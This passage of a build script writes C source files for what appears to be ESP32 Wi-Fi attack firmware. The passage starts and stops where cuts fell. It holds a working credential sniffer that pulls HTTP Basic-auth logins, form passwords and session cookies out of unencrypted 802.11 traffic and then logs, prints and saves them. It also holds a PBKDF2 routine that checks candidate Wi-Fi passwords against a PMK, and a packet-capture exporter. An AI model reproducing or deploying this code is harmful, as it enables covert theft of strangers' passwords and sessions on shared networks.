    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static size_t b64_decode(const char *in, char *out, size_t out_sz)
{
    size_t oi = 0;
    int val = 0, valb = -8;
    
    for (; *in && *in != '\r' && *in != '\n' && *in != ' '; in++) {
        int d = b64_val(*in);
        if (d < 0) continue;
        val = (val << 6) + d;
        valb += 6;
        if (valb >= 0) {
            if (oi + 1 >= out_sz) break;
            out[oi++] = (char)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    out[oi] = '\0';
    return oi;
}

/* ==========================================================================
 *  URL Decode
 * ========================================================================== */

static void url_decode(const char *in, char *out, size_t out_sz)
{
    size_t oi = 0;
    for (size_t i = 0; in[i] && oi + 1 < out_sz; ) {
        if (in[i] == '%' && isxdigit((unsigned char)in[i+1]) &&
            isxdigit((unsigned char)in[i+2])) {
            char hex[3] = { in[i+1], in[i+2], 0 };
            out[oi++] = (char)strtol(hex, NULL, 16);
            i += 3;
        } else if (in[i] == '+') {
            out[oi++] = ' ';
            i++;
        } else {
            out[oi++] = in[i++];
        }
    }
    out[oi] = '\0';
}

/* ==========================================================================
 *  Key-Value Extraction
 * ========================================================================== */

bool extract_kv(const char *hay, const char *key, char *out, size_t out_sz)
{
    if (!hay || !key || !out || out_sz == 0) return false;
    
    size_t klen = strlen(key);
    const char *p = hay;
    
    while ((p = strstr(p, key)) != NULL) {
        /* Ensure start of a field (start of string, or after & ? \n space) */
        if (p != hay && p[-1] != '&' && p[-1] != '?' && 
            p[-1] != '\n' && p[-1] != ' ') {
            p += klen;
            continue;
        }
        
        /* Key must be followed by '=' */
        if (p[klen] != '=') { 
            p += klen; 
            continue; 
        }
        
        p += klen + 1; /* Skip past "key=" */
        
        size_t n = 0;
        while (p[n] && p[n] != '&' && p[n] != ' ' && 
               p[n] != '\r' && p[n] != '\n' && n + 1 < out_sz) {
            n++;
        }
        
        char tmp[96];
        if (n >= sizeof(tmp)) n = sizeof(tmp) - 1;
        memcpy(tmp, p, n);
        tmp[n] = '\0';
        url_decode(tmp, out, out_sz);
        
        return out[0] != '\0';
    }
    return false;
}

/* ==========================================================================
 *  HTTP Header Extraction
 * ========================================================================== */

static void header_value(const char *headers, const char *name,
                         char *out, size_t out_sz)
{
    out[0] = '\0';
    const char *p = headers;
    size_t nlen = strlen(name);
    
    while (*p) {
        /* Case-insensitive start-of-line match */
        bool match = true;
        for (size_t i = 0; i < nlen; i++) {
            if (tolower((unsigned char)p[i]) != tolower((unsigned char)name[i])) {
                match = false; 
                break;
            }
        }
        if (match && p[nlen] == ':') {
            p += nlen + 1;
            while (*p == ' ') p++;
            size_t n = 0;
            while (p[n] && p[n] != '\r' && p[n] != '\n' && n + 1 < out_sz) n++;
            memcpy(out, p, n);
            out[n] = '\0';
            return;
        }
        /* Advance to next line */
        const char *nl = strstr(p, "\n");
        if (!nl) break;
        p = nl + 1;
    }
}

/* ==========================================================================
 *  Credential Storage
 * ========================================================================== */

void creds_push(const cred_hit_t *hit)
{
    if (!g_cred_lock || !hit) return;
    
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);

    /* Dedup: same host+user+pass already stored? */
    for (int i = 0; i < g_cred_count; i++) {
        if (strcmp(g_creds[i].host, hit->host) == 0 &&
            strcmp(g_creds[i].user, hit->user) == 0 &&
            strcmp(g_creds[i].pass, hit->pass) == 0) {
            xSemaphoreGive(g_cred_lock);
            return;
        }
    }

    if (g_cred_count < MAX_CREDS) {
        g_creds[g_cred_count++] = *hit;
    } else {
        /* Overwrite oldest */
        memmove(&g_creds[0], &g_creds[1], sizeof(cred_hit_t) * (MAX_CREDS - 1));
        g_creds[MAX_CREDS - 1] = *hit;
    }

    xSemaphoreGive(g_cred_lock);

    ESP_LOGW(TAG, "CRED HIT host=%s user=%s pass=%s",
             hit->host, 
             hit->user[0] ? hit->user : "-",
             hit->pass[0] ? hit->pass : "-");
}

/* ==========================================================================
 *  HTTP Parsing
 * ========================================================================== */

static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
                             const uint8_t sip[4], const uint8_t dip[4])
{
    if (tcp_len < 16) return;
    if (!(tcp[0] == 'G' || tcp[0] == 'P' || tcp[0] == 'H' ||
          tcp[0] == 'O' || tcp[0] == 'D' || tcp[0] == 'T')) return;

    size_t scan = tcp_len < 1500 ? tcp_len : 1500;
    char buf[1501];
    memcpy(buf, tcp, scan);
    buf[scan] = '\0';

    char host[64] = {0};
    header_value(buf, "Host", host, sizeof(host));
    if (host[0] == '\0') return;

    cred_hit_t hit;
    memset(&hit, 0, sizeof(hit));
    snprintf(hit.host, sizeof(hit.host), "%s", host);
    memcpy(hit.src_ip, sip, 4);
    memcpy(hit.dst_ip, dip, 4);
    hit.time_us = esp_timer_get_time();

    /* Path from request line */
    const char *sp1 = strchr(buf, ' ');
    if (sp1) {
        sp1++;
        const char *sp2 = strchr(sp1, ' ');
        size_t plen = sp2 ? (size_t)(sp2 - sp1) : 0;
        if (plen > 0 && plen < sizeof(hit.path)) {
            memcpy(hit.path, sp1, plen);
            hit.path[plen] = '\0';
        }
    }

    /* Cookie */
    header_value(buf, "Cookie", hit.cookie, sizeof(hit.cookie));

    /* Authorization: Basic base64(user:pass) */
    char auth[128] = {0};
    header_value(buf, "Authorization", auth, sizeof(auth));
    if (strncmp(auth, "Basic ", 6) == 0 || strncmp(auth, "basic ", 6) == 0) {
        char decoded[96] = {0};
        b64_decode(auth + 6, decoded, sizeof(decoded));
        char *colon = strchr(decoded, ':');
        if (colon) {
            *colon = '\0';
            snprintf(hit.user, sizeof(hit.user), "%.47s", decoded);
            snprintf(hit.pass, sizeof(hit.pass), "%s", colon + 1);
        }
    }

    /* 
     * Form fields in URL or body.
     * FIXED: Keys do NOT include '='. extract_kv() checks for '=' after the key.
     */
    static const char *USER_KEYS[] = {
        "username", "user", "email", "login", "uid", NULL
    };
    static const char *PASS_KEYS[] = {
        "password", "pass", "passwd", "pwd", "secret", NULL
    };

    if (hit.user[0] == '\0') {
        for (int i = 0; USER_KEYS[i]; i++) {
            if (extract_kv(buf, USER_KEYS[i], hit.user, sizeof(hit.user))) break;
        }
    }
    if (hit.pass[0] == '\0') {
        for (int i = 0; PASS_KEYS[i]; i++) {
            if (extract_kv(buf, PASS_KEYS[i], hit.pass, sizeof(hit.pass))) break;
        }
    }

    bool interesting = (hit.user[0] || hit.pass[0] ||
                        (hit.cookie[0] && (strstr(hit.cookie, "session") ||
                                           strstr(hit.cookie, "PHPSESSID") ||
                                           strstr(hit.cookie, "auth"))));

    if (interesting) {
        creds_push(&hit);
    }
}

/* ==========================================================================
 *  Packet Feed (802.11 → IPv4 → TCP → HTTP)
 * ========================================================================== */

void creds_feed_packet(const uint8_t *data, size_t len)
{
    if (!atomic_load(&g_creds_enabled) || data == NULL || len < 40) return;
    if ((data[0] & 0x0C) != 0x08) return;   /* Data frame only */

    uint8_t subtype = (data[0] >> 4) & 0x0F;
    bool to_ds   = (data[1] & 0x01) != 0;
    bool from_ds = (data[1] & 0x02) != 0;
    size_t hdr = (subtype & 0x08) ? 26 : 24;
    if (to_ds && from_ds) hdr += 6;         /* 4-address WDS */

    /* Protected (encrypted) frames — skip */
    if (data[1] & 0x40) return;

    if (len < hdr + 8 + 20) return;

    /* LLC/SNAP IPv4 */
    static const uint8_t SNAP_IP[8] = {0xAA,0xAA,0x03,0,0,0,0x08,0x00};
    if (memcmp(data + hdr, SNAP_IP, 8) != 0) return;

    const uint8_t *ip = data + hdr + 8;
    size_t ip_len = len - hdr - 8;
    if (ip_len < 20) return;
    if ((ip[0] >> 4) != 4) return;          /* IPv4 only */
    if (ip[9] != 6) return;                 /* TCP only */

    uint8_t ihl = (ip[0] & 0x0F) * 4;
    if (ihl < 20 || ip_len < (size_t)ihl + 20) return;

    const uint8_t *sip = ip + 12;
    const uint8_t *dip = ip + 16;

    const uint8_t *tcp = ip + ihl;
    size_t tcp_len = ip_len - ihl;
    uint8_t doff = ((tcp[12] >> 4) & 0x0F) * 4;
    if (doff < 20 || tcp_len < doff) return;

    uint16_t dport = (uint16_t)((tcp[2] << 8) | tcp[3]);
    uint16_t sport = (uint16_t)((tcp[0] << 8) | tcp[1]);
    bool likely_http = (dport == 80 || dport == 8080 || dport == 8000 ||
                        dport == 3128 || dport == 8888 ||
                        sport == 80 || sport == 8080);

    const uint8_t *payload = tcp + doff;
    size_t plen = tcp_len - doff;
    if (plen < 16) return;

    /* Fast reject if it doesn't look like HTTP */
    if (!(payload[0] == 'G' || payload[0] == 'P' || payload[0] == 'H' ||
          payload[0] == 'O' || payload[0] == 'D')) {
        if (!likely_http) return;
    }

    creds_parse_http(payload, plen, sip, dip);
}

/* ==========================================================================
 *  Public API
 * ========================================================================== */

esp_err_t creds_init(void)
{
    if (g_cred_lock == NULL) {
        g_cred_lock = xSemaphoreCreateMutex();
        if (g_cred_lock == NULL) return ESP_ERR_NO_MEM;
    }
    atomic_store(&g_creds_enabled, true);
    ESP_LOGI(TAG, "Credential sniffer ready");
    return ESP_OK;
}

void creds_set_enabled(bool on) { atomic_store(&g_creds_enabled, on); }
bool creds_is_enabled(void)     { return atomic_load(&g_creds_enabled); }

uint16_t creds_count(void)
{
    if (g_cred_lock == NULL) return 0;
    
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    uint16_t count = g_cred_count;
    xSemaphoreGive(g_cred_lock);
    
    return count;
}

void creds_clear(void)
{
    if (g_cred_lock == NULL) return;
    
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    g_cred_count = 0;
    memset(g_creds, 0, sizeof(g_creds));
    xSemaphoreGive(g_cred_lock);
}

void creds_print(void)
{
    if (g_cred_lock == NULL) return;
    
    /* Copy under lock, then print without holding it */
    cred_hit_t local[MAX_CREDS];
    uint16_t count = 0;
    
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    count = g_cred_count;
    if (count > MAX_CREDS) count = MAX_CREDS;
    memcpy(local, g_creds, sizeof(cred_hit_t) * count);
    xSemaphoreGive(g_cred_lock);

    printf("\n==== CAPTURED CREDENTIALS / SESSIONS (%u) ====\n", count);
    for (int i = 0; i < count; i++) {
        printf("[%d] host=%s path=%s\n", i + 1, local[i].host, local[i].path);
        printf("    src=%u.%u.%u.%u dst=%u.%u.%u.%u\n",
               local[i].src_ip[0], local[i].src_ip[1],
               local[i].src_ip[2], local[i].src_ip[3],
               local[i].dst_ip[0], local[i].dst_ip[1],
               local[i].dst_ip[2], local[i].dst_ip[3]);
        if (local[i].user[0])   printf("    user=%s\n", local[i].user);
        if (local[i].pass[0])   printf("    pass=%s\n", local[i].pass);
        if (local[i].cookie[0]) printf("    cookie=%s\n", local[i].cookie);
    }
    if (count == 0) printf("(empty)\n");
    printf("==============================================\n");
}

esp_err_t creds_save(const char *path)
{
    if (path == NULL) return ESP_ERR_INVALID_ARG;
    if (g_cred_lock == NULL) return ESP_ERR_INVALID_STATE;
    
    /* Copy under lock, then write without holding it */
    cred_hit_t local[MAX_CREDS];
    uint16_t count = 0;
    
    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
    count = g_cred_count;
    if (count > MAX_CREDS) count = MAX_CREDS;
    memcpy(local, g_creds, sizeof(cred_hit_t) * count);
    xSemaphoreGive(g_cred_lock);

    FILE *f = fopen(path, "w");
    if (f == NULL) return ESP_FAIL;

    for (int i = 0; i < count; i++) {
        fprintf(f, "host=%s\nuser=%s\npass=%s\ncookie=%s\npath=%s\n---\n",
                local[i].host, local[i].user, local[i].pass,
                local[i].cookie, local[i].path);
    }
    fclose(f);
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/cred_sniffer.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/dragonfly_sim.c"
#include "dragonfly_sim.h"

#include <string.h>
#include <stdint.h>
#include <stdatomic.h>

#include "esp_log.h"

static atomic_bool s_init = ATOMIC_VAR_INIT(false);
static const char *TAG = "dragonfly";

/* ==========================================================================
 *  Self-contained FIPS 180-4 SHA-256, HMAC-SHA256 & PBKDF2-HMAC-SHA256
 *  (Compatible with ESP-IDF v5.x and v6.x / Mbed TLS 3.x & 4.0)
 * ========================================================================== */

typedef struct {
    uint32_t state[8];
    uint64_t bitcount;
    uint8_t buffer[64];
} sha256_ctx_t;

static const uint32_t K256[64] = {
    0x428a2f98UL, 0x71374491UL, 0xb5c0fbcfUL, 0xe9b5dba5UL,
    0x3956c25bUL, 0x59f111f1UL, 0x923f82a4UL, 0xab1c5ed5UL,
    0xd807aa98UL, 0x12835b01UL, 0x243185beUL, 0x550c7dc3UL,
    0x72be5d74UL, 0x80deb1feUL, 0x9bdc06a7UL, 0xc19bf174UL,
    0xe49b69c1UL, 0xefbe4786UL, 0x0fc19dc6UL, 0x240ca1ccUL,
    0x2de92c6fUL, 0x4a7484aaUL, 0x5cb0a9dcUL, 0x76f988daUL,
    0x983e5152UL, 0xa831c66dUL, 0xb00327c8UL, 0xbf597fc7UL,
    0xc6e00bf3UL, 0xd5a79147UL, 0x06ca6351UL, 0x14292967UL,
    0x27b70a85UL, 0x2e1b2138UL, 0x4d2c6dfcUL, 0x53380d13UL,
    0x650a7354UL, 0x766a0abbUL, 0x81c2c92eUL, 0x92722c85UL,
    0xa2bfe8a1UL, 0xa81a664bUL, 0xc24b8b70UL, 0xc76c51a3UL,
    0xd192e819UL, 0xd6990624UL, 0xf40e3585UL, 0x106aa070UL,
    0x19a4c116UL, 0x1e376c08UL, 0x2748774cUL, 0x34b0bcb5UL,
    0x391c0cb3UL, 0x4ed8aa4aUL, 0x5b9cca4fUL, 0x682e6ff3UL,
    0x748f82eeUL, 0x78a5636fUL, 0x84c87814UL, 0x8cc70208UL,
    0x90befffaUL, 0xa4506cebUL, 0xbef9a3f7UL, 0xc67178f2UL
};

static inline uint32_t rotr32(uint32_t x, uint32_t n)
{
    return (x >> n) | (x << (32U - n));
}

static void sha256_transform(sha256_ctx_t *ctx, const uint8_t data[64])
{
    uint32_t w[64];
    for (int i = 0; i < 16; i++) {
        w[i] = ((uint32_t)data[i * 4 + 0] << 24) |
               ((uint32_t)data[i * 4 + 1] << 16) |
               ((uint32_t)data[i * 4 + 2] << 8)  |
               ((uint32_t)data[i * 4 + 3]);
    }
    for (int i = 16; i < 64; i++) {
        uint32_t s0 = rotr32(w[i - 15], 7) ^ rotr32(w[i - 15], 18) ^ (w[i - 15] >> 3);
        uint32_t s1 = rotr32(w[i - 2], 17) ^ rotr32(w[i - 2], 19) ^ (w[i - 2] >> 10);
        w[i] = w[i - 16] + s0 + w[i - 7] + s1;
    }

    uint32_t a = ctx->state[0], b = ctx->state[1], c = ctx->state[2], d = ctx->state[3];
    uint32_t e = ctx->state[4], f = ctx->state[5], g = ctx->state[6], h = ctx->state[7];

    for (int i = 0; i < 64; i++) {
        uint32_t S1 = rotr32(e, 6) ^ rotr32(e, 11) ^ rotr32(e, 25);
        uint32_t ch = (e & f) ^ ((~e) & g);
        uint32_t temp1 = h + S1 + ch + K256[i] + w[i];
        uint32_t S0 = rotr32(a, 2) ^ rotr32(a, 13) ^ rotr32(a, 22);
        uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
        uint32_t temp2 = S0 + maj;

        h = g; g = f; f = e; e = d + temp1;
        d = c; c = b; b = a; a = temp1 + temp2;
    }

    ctx->state[0] += a; ctx->state[1] += b; ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f; ctx->state[6] += g; ctx->state[7] += h;
}

static void sha256_init(sha256_ctx_t *ctx)
{
    ctx->state[0] = 0x6a09e667UL; ctx->state[1] = 0xbb67ae85UL;
    ctx->state[2] = 0x3c6ef372UL; ctx->state[3] = 0xa54ff53aUL;
    ctx->state[4] = 0x510e527fUL; ctx->state[5] = 0x9b05688cUL;
    ctx->state[6] = 0x1f83d9abUL; ctx->state[7] = 0x5be0cd19UL;
    ctx->bitcount = 0;
    memset(ctx->buffer, 0, sizeof(ctx->buffer));
}

static void sha256_update(sha256_ctx_t *ctx, const uint8_t *data, size_t len)
{
    if (len == 0) return;
    size_t idx = (size_t)((ctx->bitcount >> 3) & 0x3FU);
    ctx->bitcount += (uint64_t)len << 3;

    size_t part_len = 64U - idx;
    size_t i = 0;
    if (len >= part_len) {
        memcpy(&ctx->buffer[idx], data, part_len);
        sha256_transform(ctx, ctx->buffer);
        for (i = part_len; i + 63U < len; i += 64U) {
            sha256_transform(ctx, &data[i]);
        }
        idx = 0;
    }
    memcpy(&ctx->buffer[idx], &data[i], len - i);
}

static void sha256_final(sha256_ctx_t *ctx, uint8_t digest[32])
{
    uint8_t bits[8];
    for (int i = 0; i < 8; i++) {
        bits[i] = (uint8_t)(ctx->bitcount >> ((7 - i) * 8));
    }
    size_t idx = (size_t)((ctx->bitcount >> 3) & 0x3FU);
    size_t pad_len = (idx < 56U) ? (56U - idx) : (120U - idx);
    uint8_t pad[64];
    memset(pad, 0, sizeof(pad));
    pad[0] = 0x80U;
    sha256_update(ctx, pad, pad_len);
    sha256_update(ctx, bits, 8);
    for (int i = 0; i < 8; i++) {
        digest[i * 4 + 0] = (uint8_t)(ctx->state[i] >> 24);
        digest[i * 4 + 1] = (uint8_t)(ctx->state[i] >> 16);
        digest[i * 4 + 2] = (uint8_t)(ctx->state[i] >> 8);
        digest[i * 4 + 3] = (uint8_t)(ctx->state[i]);
    }
}

static void hmac_sha256(const uint8_t *key, size_t key_len,
                        const uint8_t *data, size_t data_len,
                        uint8_t out[32])
{
    uint8_t k_ipad[64];
    uint8_t k_opad[64];
    uint8_t tk[32];

    if (key_len > 64) {
        sha256_ctx_t tctx;
        sha256_init(&tctx);
        sha256_update(&tctx, key, key_len);
        sha256_final(&tctx, tk);
        key = tk;
        key_len = 32;
    }

    memset(k_ipad, 0x36, sizeof(k_ipad));
    memset(k_opad, 0x5c, sizeof(k_opad));
    for (size_t i = 0; i < key_len; i++) {
        k_ipad[i] ^= key[i];
        k_opad[i] ^= key[i];
    }

    sha256_ctx_t ctx;
    uint8_t inner[32];
    sha256_init(&ctx);
    sha256_update(&ctx, k_ipad, 64);
    sha256_update(&ctx, data, data_len);
    sha256_final(&ctx, inner);

    sha256_init(&ctx);
    sha256_update(&ctx, k_opad, 64);
    sha256_update(&ctx, inner, 32);
    sha256_final(&ctx, out);
}

static void pbkdf2_hmac_sha256(const uint8_t *password, size_t pwd_len,
                               const uint8_t *salt, size_t salt_len,
                               uint32_t iterations, uint8_t out[32])
{
    uint8_t u[32];
    uint8_t t[32];
    uint8_t salt_blk[128];
    if (salt_len > sizeof(salt_blk) - 4) {
        salt_len = sizeof(salt_blk) - 4;
    }
    memcpy(salt_blk, salt, salt_len);
    salt_blk[salt_len + 0] = 0;
    salt_blk[salt_len + 1] = 0;
    salt_blk[salt_len + 2] = 0;
    salt_blk[salt_len + 3] = 1;

    hmac_sha256(password, pwd_len, salt_blk, salt_len + 4, u);
    memcpy(t, u, 32);

    for (uint32_t i = 1; i < iterations; i++) {
        hmac_sha256(password, pwd_len, u, 32, u);
        for (int j = 0; j < 32; j++) {
            t[j] ^= u[j];
        }
    }
    memcpy(out, t, 32);
}

esp_err_t dragonfly_sim_init(void)
{
    atomic_store(&s_init, true);
    ESP_LOGI(TAG, "Dragonfly simulator initialized (PBKDF2-SHA256)");
    return ESP_OK;
}

bool dragonfly_sim_validate(const uint8_t *password, size_t pwd_len,
                            const uint8_t *pmk, 
                            const uint8_t *salt, size_t salt_len)
{
    if (!atomic_load(&s_init) || !password || !pmk || !salt || salt_len == 0) {
        return false;
    }

    uint8_t calc[32] = {0};
    pbkdf2_hmac_sha256(password, pwd_len, salt, salt_len, 4096, calc);
    return memcmp(calc, pmk, sizeof(calc)) == 0;
}

bool dragonfly_sim_try_commit(const uint8_t *pwd, size_t pwd_len,
                              const uint8_t *expected_element)
{
    (void)pwd; 
    (void)pwd_len; 
    (void)expected_element;
    return false;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/dragonfly_sim.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/export.c"
#include "export.h"
#include "storage_sd.h"

#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <inttypes.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "export";

#define EXPORT_FLUSH_INTERVAL 32

static export_mode_t g_mode = EXPORT_MODE_OFF;
static FILE *g_file = NULL;
static SemaphoreHandle_t g_lock = NULL;

static uint32_t g_packets = 0;
static uint32_t g_bytes = 0;
static uint32_t g_dropped = 0;
static uint32_t g_since_flush = 0;
static char g_path[128] = {0};

/* -------------------------------------------------------------------------
 *  Protocol Structs (Packed for correct binary layout)
 * ----------------------------------------------------------------------- */

typedef struct __attribute__((packed)) {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} pcap_hdr_t;

typedef struct __attribute__((packed)) {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

typedef struct __attribute__((packed)) {
    uint32_t block_type;
    uint32_t block_total_length;
    uint32_t byte_order_magic;
    uint16_t major_version;
    uint16_t minor_version;
    int64_t  section_length;
    uint32_t opt_end;
    uint32_t block_total_length_2;
} pcapng_shb_t;

typedef struct __attribute__((packed)) {
    uint32_t block_type;
    uint32_t block_total_length;
    uint16_t linktype;
    uint16_t reserved;
    uint32_t snaplen;
    uint32_t opt_end;
    uint32_t block_total_length_2;
} pcapng_idb_t;

typedef struct __attribute__((packed)) {
    uint32_t block_type;
    uint32_t block_total_length;
    uint32_t interface_id;
    uint32_t timestamp_high;
    uint32_t timestamp_low;
    uint32_t captured_len;
    uint32_t original_len;
} pcapng_epb_hdr_t;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static void close_file_locked(void)
{
    if (g_file != NULL) {
        fclose(g_file);
        g_file = NULL;
    }
    g_since_flush = 0;
}

static void flush_if_needed_locked(void)
{
    if (g_file != NULL) {
        g_since_flush++;
        if (g_since_flush >= EXPORT_FLUSH_INTERVAL) {
            fflush(g_file);
            g_since_flush = 0;
        }
    }
}

static esp_err_t write_pcap_header_locked(void)
{
    pcap_hdr_t hdr = {
        .magic_number = 0xA1B2C3D4,
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 2304,
        .network = 105 /* DLT_IEEE802_11 */
    };
    
    if (fwrite(&hdr, 1, sizeof(hdr), g_file) != sizeof(hdr)) {
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

static esp_err_t write_pcap_record_locked(const uint8_t *data, size_t len, uint64_t ts_us)
{
    pcaprec_hdr_t rec = {
        .ts_sec = (uint32_t)(ts_us / 1000000),
        .ts_usec = (uint32_t)(ts_us % 1000000),
        .incl_len = (uint32_t)len,
        .orig_len = (uint32_t)len
    };
    
    if (fwrite(&rec, 1, sizeof(rec), g_file) != sizeof(rec)) return ESP_ERR_NO_MEM;
    if (len > 0 && fwrite(data, 1, len, g_file) != len) return ESP_ERR_NO_MEM;
    
    return ESP_OK;
}

static esp_err_t write_pcapng_header_locked(void)
{
    pcapng_shb_t shb = {
        .block_type = 0x0A0D0D0A,
        .block_total_length = sizeof(pcapng_shb_t),
        .byte_order_magic = 0x1A2B3C4D,
        .major_version = 1,
        .minor_version = 0,
        .section_length = -1,
        .opt_end = 0x00000000,
        .block_total_length_2 = sizeof(pcapng_shb_t)
    };
    
    if (fwrite(&shb, 1, sizeof(shb), g_file) != sizeof(shb)) return ESP_ERR_NO_MEM;

    pcapng_idb_t idb = {
        .block_type = 0x00000001,
        .block_total_length = sizeof(pcapng_idb_t),
        .linktype = 105,
        .reserved = 0,
        .snaplen = 2304,
        .opt_end = 0x00000000,
        .block_total_length_2 = sizeof(pcapng_idb_t)
    };
    
    if (fwrite(&idb, 1, sizeof(idb), g_file) != sizeof(idb)) return ESP_ERR_NO_MEM;
    
    return ESP_OK;
}

static esp_err_t write_pcapng_packet_locked(const uint8_t *data, size_t len, uint64_t ts_us)
{
    uint32_t padding = (4 - (len % 4)) % 4;
    uint32_t block_len = sizeof(pcapng_epb_hdr_t) + len + padding + 4; /* +4 for trailing block length */

    pcapng_epb_hdr_t hdr = {
        .block_type = 0x00000006,
        .block_total_length = block_len,
        .interface_id = 0,
        .timestamp_high = (uint32_t)(ts_us >> 32),
        .timestamp_low = (uint32_t)(ts_us & 0xFFFFFFFF),
        .captured_len = (uint32_t)len,
        .original_len = (uint32_t)len
    };

    if (fwrite(&hdr, 1, sizeof(hdr), g_file) != sizeof(hdr)) return ESP_ERR_NO_MEM;
    if (len > 0 && fwrite(data, 1, len, g_file) != len) return ESP_ERR_NO_MEM;
    
    if (padding > 0) {
        uint8_t pad[4] = {0};
        if (fwrite(pad, 1, padding, g_file) != padding) return ESP_ERR_NO_MEM;
    }
    
    if (fwrite(&block_len, 1, 4, g_file) != 4) return ESP_ERR_NO_MEM;
    
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t export_init(void)
{
    if (g_lock != NULL) return ESP_OK;
    
    g_lock = xSemaphoreCreateMutex();
    if (g_lock == NULL) return ESP_ERR_NO_MEM;
    
    g_mode = EXPORT_MODE_OFF;
    g_packets = 0;
    g_bytes = 0;
    g_dropped = 0;
    g_since_flush = 0;
    memset(g_path, 0, sizeof(g_path));
    
    ESP_LOGI(TAG, "Export module initialized");
    return ESP_OK;
}

esp_err_t export_start(export_mode_t mode, const char *base_path)
{
    if (mode == EXPORT_MODE_OFF) return export_stop();
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;
    
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    close_file_locked();
    g_packets = 0;
    g_bytes = 0;
    g_dropped = 0;
    g_since_flush = 0;
    g_mode = mode;

    snprintf(g_path, sizeof(g_path), "%s", base_path ? base_path : "/sd/export");
    esp_err_t rc = storage_sd_mount();
    
    if (rc != ESP_OK && rc != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "SD mount failed: %s", esp_err_to_name(rc));
        g_mode = EXPORT_MODE_OFF;
        xSemaphoreGive(g_lock);
        return rc;
    }

    g_file = fopen(g_path, "wb");
    if (g_file == NULL) {
        ESP_LOGE(TAG, "Failed to open %s", g_path);
        g_mode = EXPORT_MODE_OFF;
        xSemaphoreGive(g_lock);
        return ESP_ERR_NO_MEM;
    }

    switch (mode) {
        case EXPORT_MODE_PCAP:
            rc = write_pcap_header_locked();
            break;
        case EXPORT_MODE_PCAP_NG:
            rc = write_pcapng_header_locked();
            break;
        case EXPORT_MODE_NETXML:
            fprintf(g_file, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<detection-run>\n");
            break;
        case EXPORT_MODE_CSV:
            fprintf(g_file, "ts,channel,rssi,len,data\n");
            break;
        case EXPORT_MODE_JSONL:
            fprintf(g_file, "[");
            break;
        case EXPORT_MODE_ZST:
            fprintf(g_file, "ZSTREAM\n");
            break;
        default:
            rc = ESP_ERR_INVALID_ARG;
            break;
    }

    if (rc != ESP_OK) {
        close_file_locked();
        g_mode = EXPORT_MODE_OFF;
    }
    
    xSemaphoreGive(g_lock);
    return rc;
}

esp_err_t export_stop(void)
{
    if (g_lock == NULL) return ESP_OK;
    
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) return ESP_ERR_TIMEOUT;
    
    if (g_file != NULL) {
        if (g_mode == EXPORT_MODE_NETXML) fprintf(g_file, "</detection-run>\n");
        if (g_mode == EXPORT_MODE_JSONL) fprintf(g_file, "\n]\n");
        if (g_mode == EXPORT_MODE_ZST) fprintf(g_file, "END\n");
        
        fflush(g_file);
        close_file_locked();
    }
    
    export_mode_t prev = g_mode;
    g_mode = EXPORT_MODE_OFF;
    
    (void)prev;
    ESP_LOGI(TAG, "Export stopped mode=%d packets=%"PRIu32" bytes=%"PRIu32,
             prev, g_packets, g_bytes);
             
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Writers
 * ----------------------------------------------------------------------- */

esp_err_t export_write_packet(const uint8_t *data, size_t len,
                              uint8_t channel, int8_t rssi,
                              uint64_t timestamp_us)
{
    if (g_mode == EXPORT_MODE_OFF || g_lock == NULL) return ESP_ERR_INVALID_STATE;
    
    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(50)) != pdTRUE) {
        g_dropped++;
        return ESP_ERR_TIMEOUT;
    }
    
    if (g_file == NULL) {
        xSemaphoreGive(g_lock);
        return ESP_ERR_INVALID_STATE;
    }

    esp_err_t rc = ESP_OK;
    
    switch (g_mode) {
        case EXPORT_MODE_PCAP:
            rc = write_pcap_record_locked(data, len, timestamp_us);
            break;
        case EXPORT_MODE_PCAP_NG:
            rc = write_pcapng_packet_locked(data, len, timestamp_us);
            break;
        case EXPORT_MODE_CSV:
            fprintf(g_file, "%" PRIu64 ",%u,%d,%zu,", timestamp_us, channel, rssi, len);
            for (size_t i = 0; i < len && i < 64; i++) fprintf(g_file, "%02X", data[i]);
            fprintf(g_file, "\n");
            break;
        case EXPORT_MODE_JSONL:
            if (g_packets > 0) fprintf(g_file, ",\n");
            fprintf(g_file, "{\"ts\":%" PRIu64 ",\"ch\":%u,\"rssi\":%d,\"len\":%zu,\"data\":\"",
                    timestamp_us, channel, rssi, len);
            for (size_t i = 0; i < len && i < 64; i++) fprintf(g_file, "%02X", data[i]);
            fprintf(g_file, "\"}");
            break;
